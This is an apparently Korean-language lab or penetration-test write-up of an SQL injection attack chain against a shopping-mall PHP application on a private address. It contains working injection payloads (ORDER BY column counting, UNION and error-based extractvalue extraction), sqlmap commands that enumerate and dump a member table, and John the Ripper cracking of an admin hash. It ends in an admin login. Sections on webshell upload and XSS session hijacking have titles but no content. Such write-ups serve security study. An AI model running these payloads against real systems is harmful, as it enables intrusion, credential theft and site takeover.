## 1. 권한 탈취를 위한 주요 공격 시나리오
---
### 1.1 SQL Injection을 통한 관리자 계정 탈취

#### 1단계: 취약점 탐색 (Vulnerability Scanning)
공격자가 임의의 SQL 쿼리를 주입할 수 있는 지점(Injection Point)을 식별하는 단계입니다.

* **타겟:** 로그인 폼, 게시판 검색창, 상품 상세 페이지 URL 파라미터 등
* **방법:** 입력값에 싱글 쿼테이션(`'`)을 입력하여 데이터베이스 에러 발생 여부 및 응답 형태를 확인합니다.

##### 가. 로그인 폼 분석 (ID: admin' / PW: 1234 주입)
* **현황:** 관리자 로그인 페이지의 ID 입력란에 `admin'`를 주입하여 전송함.

![[SQL_Injection_취약점탐색1.png]]

* **분석 결과:** MySQL 에러 코드 `1064`와 함께 `near "'admin'"` 문구가 포함된 에러 메시지가 화면에 출력됨.
- **취약점 판단:** 이는 입력값이 서버 측 SQL 쿼리 문법의 일부로 해석되고 있음을 의미하며, 주석 처리(`-- ` 등)를 이용한 **인증 우회(Authentication Bypass)** 공격에 취약한 구조임이 확인됨.

##### 나. 제품 상세 페이지 URL 분석 (ps_goid=' 주입)
* **현황:** 제품 상세 정보 페이지의 URL 파라미터값에 싱글 쿼테이션(`'`)을 주입함.
	`.../m_mall_detail.php?ps_ctid=03070000&ps_goid='`

![[SQL_Injection_취약점탐색2.png]]

* **분석 결과: **`!!coreMall(MySQL DB ERROR)!!` 메시지와 함께 내부 쿼리의 일부인 `and approval_date > 0` 구문이 노출됨.
- **취약점 판단:** 애플리케이션에서 입력값에 대한 적절한 필터링이 이루어지지 않아 내부 쿼리 구조가 노출되었으며, 이를 통해 데이터베이스 내부의 민감 정보를 추출하는 **Union-Based SQL Injection** 공격이 가능함을 시사함.

#### 2단계: 컬럼 개수 식별 및 공격 기법 전환

데이터 추출의 초석이 되는 컬럼 개수를 파악하고, 웹 애플리케이션의 응답 특성에 맞춘 최적의 공격 기법을 도출하는 단계입니다.

##### 가. 자동화 도구 분석

- **분석 내용:** 효율적인 분석을 위해 `sqlmap`을 활용하여 취약점 스캐닝을 수행함.
![[SQL_Injection_취약점탐색3.png]]
- **사용 명령어:** `sqlmap -u ".../m_mall_detail.php?ps_ctid=03070000&ps_goid=1" --batch --technique=U`

- **결과:** 도구는 17개의 컬럼으로 판단하여 아래와 같은 구문을 생성 및 주입함.
	- **주입 구문:** `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' UNION ALL SELECT NULL,NULL, ... (총 17개) ... %23`
	- **오류 발생:** `Error 1222: Different number of columns` (원본 쿼리와의 컬럼 수 불일치확인)

- **원인 분석:** 타겟 환경의 복잡한 SQL 쿼리 구조나 파라미터 간의 상관관계로 인해 자동화 도구의 오탐(False Positive)이 발생한 것으로 판단됨.

##### 나. 수동 분석을 통한 컬럼 개수 확정

- **분석 방법:** `UNION SELECT` 공격을 수행하기 위해서는 원본 쿼리가 사용하는 컬럼의 개수와 공격 구문의 컬럼 개수가 반드시 일치해야 함. 이를 위해 결과 집합을 특정 컬럼 기준으로 정렬하는 `ORDER BY` 절을 사용하여, 에러가 발생하기 직전의 숫자를 통해 원본 쿼리의 컬럼 개수를 파악함.

- **분석 과정:**
    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 17%23` : 정상 응답 (자동화 도구가 식별한 17개 지점에서 정상 작동 확인)
    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 80%23` : 정상 응답 (순차적 증가를 통해 80번째 컬럼까지 데이터가 존재함을 확인)
    - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' ORDER BY 81%23` : 에러 발생 (존재하지 않는 81번째 컬럼 참조로 인한 쿼리 오류 발생)

- **결론:** `ORDER BY` 숫자를 높여가며 응답의 변화를 탐지한 결과, 해당 페이지의 원본 쿼리는 **총 80개**의 컬럼으로 구성되어 있음을 최종 확정함.

##### 다. Union-Based 공격의 한계 및 Error-Based 전환

- **문제 발생:** 확정된 80개의 컬럼을 바탕으로 ```./m_mall_detail.php?ps_ctid=03070000&ps_goid=-1' UNION SELECT 1,2,...,80%23```을 주입하였으나, 화면이나 소스 코드(View Source) 상에 주입한 데이터가 전혀 노출되지 않는 출력 지점 부재(No Display Point) 현상이 발생함.
![[Pasted image 20260420140706.png]]

- **해결 방안:** 화면 출력에 의존하지 않고, 서버가 반환하는 SQL 에러 메시지에 데이터를 강제로 포함시키는 **Error-Based SQL Injection** 기법으로 전략을 수정함.

##### 라. 최종 공격 성공 및 데이터베이스 식별

- **공격 구문:** `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' and extractvalue(1,concat(0x3a,database()))%23`

- **최종 응답:**
![[SQL_Injection_취약점탐색4.png]]
	**XPATH syntax error: ':fsk_m_db'** > **Mysql Error Num : 1105**

- **결과 분석:** `extractvalue` 함수의 XML 파싱 에러를 유도하여 데이터베이스명인 **`fsk_m_db`**를 성공적으로 탈취함.
#### 3단계: 전체 데이터베이스 목록 추출

성공적으로 식별된 **Error-Based SQL Injection** 취약점을 활용하여, 현재 접속 중인 데이터베이스 외에 서버 내에 존재하는 전체 데이터베이스 목록을 열거(Enumeration)하는 단계입니다.

##### 가. 분석 배경 및 공격 전술

- **공격 근거:** 앞선 단계에서 `database()` 함수를 이용해 현재 DB명인 `fsk_m_db`를 탈취하는 데 성공함. 이는 서버가 `extractvalue()`와 같은 함수에 의해 발생하는 XML 파싱 에러 메시지를 필터링 없이 화면에 출력하고 있음을 의미함.

- **공격 전술:** 해당 취약점이 확인됨에 따라, MySQL의 메타데이터(모든 DB, 테이블 정보 등)가 저장된 **`information_schema`** 시스템 데이터베이스에 접근하여 서버의 전체 구조를 파악하기로 결정함.

##### 나. 실행 및 결과

- **분석 방법:** `information_schema.schemata` 테이블을 조회하고, `limit` 절을 이용하여 에러 메시지 창에 한 개씩 DB명을 출력시킴.

- **공격 구문:** - `.../m_mall_detail.php?ps_ctid=03070000&ps_goid=1' and extractvalue(1,concat(0x3a,(select schema_name from information_schema.schemata limit 0,1)))%23`

- **추출 결과:**
    - **limit 0,1:** `information_schema`
    - **limit 1,1:** `fsk_m_db`
    - **limit 2,1:** `mysql`
    - **limit 3,1:** `phpmyadmin`
    - **limit 4,1:** `test_db`

#### **4단계: 타겟 DB 선정 및 테이블 탐색 (Table Enumeration)**

식별된 여러 데이터베이스 중 실제 서비스 데이터가 집약된 타겟을 선정하고, 그 내부 구조를 파악하는 단계입니다.

- **판단 및 타겟 선정:** `information_schema`, `mysql` 등 시스템 DB를 제외하고, 실제 웹 서비스의 핵심 데이터가 포함되었을 것으로 판단되는 **`fsk_m_db`**를 최종 타겟으로 선정함.

- **분석 방법:** `fsk_m_db` 내에 존재하는 전체 테이블 목록을 호출하여 관리자 및 회원 정보와 관련된 테이블을 탐색함.

- **명령어:** `sqlmap -u "http://192.168.20.123/m_mall_detail.php?ps_ctid=03070000&ps_goid=1" -D fsk_m_db --tables --batch`
![[SQL_Injection_취약점탐색5.png]]
- **분석 결과:** 총 37개의 테이블이 확인되었으며, 명명 규칙상 회원 정보와 권한 체계가 포함될 가능성이 가장 높은 **`morning_member_table`**을 집중 분석 대상으로 확정함.

---

#### **5단계: morning_member_table 데이터 구조 및 권한 체계 분석**

선정된 테이블의 상세 데이터를 추출하여 계정 체계와 권한 등급 시스템을 파악하는 단계입니다.

- **분석 방법:** 해당 테이블의 전체 데이터를 덤프(Dump)하여 사용자별 등급을 비교 분석함.

- **명령어:** `sqlmap -u "http://192.168.20.123/m_mall_detail.php?ps_ctid=03070000&ps_goid=1" -D fsk_m_db -T morning_member_table --dump --batch`
![[SQL_Injection_취약점탐색6_1.png]]
- **분석 결과:** 
	* 다수의 회원 데이터 중 ID가 **`coreadmin`**인 계정 식별.
    - 일반 사용자의 `member_class`는 1~3인 반면, `coreadmin` 계정은 **`10`**으로 설정되어 있음을 확인. 이를 통해 해당 시스템은 `member_class`가 **10일 때 최고 관리자 권한**을 부여하는 구조임을 파악함.

#### **6단계: 패스워드 해시 추출 및 존더리퍼(John the Ripper) 크래킹**

탈취한 최고 관리자 계정의 암호화된 비밀번호를 평문으로 복구하여 침투 가능성을 검증하는 단계입니다.
![[SQL_Injection_취약점탐색6_2.png]]
- **추출 데이터:** `member_id: coreadmin` / `member_pass: mo7sLvDuVNZJ2`

- **해시 분석:** 패스워드 패턴 분석 결과, Salt값(`mo`)이 포함된 **Unix DES(descrypt)** 방식의 해시임을 식별함.

- **크래킹 수행:** 
	1. 해시 파일 생성: `echo 'coreadmin:mo7sLvDuVNZJ2' > hash.txt`
	2. 존더리퍼 실행: `john --format=descrypt hash.txt`

![[SQL_Injection_취약점탐색7.png]]
- **최종 결과:** **`coreadmin:admin123`**

### **7단계: 관리자 권한 탈취 및 침투 실증 (Final Impact)**

확보한 계정 정보를 통해 실제 웹 애플리케이션의 제어권을 획득하는 최종 단계입니다.

- **실행 내용:** 관리자 로그인 페이지에 접속하여 탈취한 `coreadmin / admin123` 정보로 인증 시도.
- **최종 결과:** 
	- **최고 관리자 권한으로 로그인 성공.**
![[SQL_Injection_취약점탐색8.png]]
	- 관리자 대시보드를 통한 사이트 설정 변경 및 서비스 전체 제어권 획득 확인.
![[SQL_Injection_취약점탐색9.png]]

---

### 1.2 파일 업로드 취약점을 통한 리버스 쉘 (WebShell)




---
### 1.3 XSS를 통한 세션 하이재킹 (Session Hijacking)

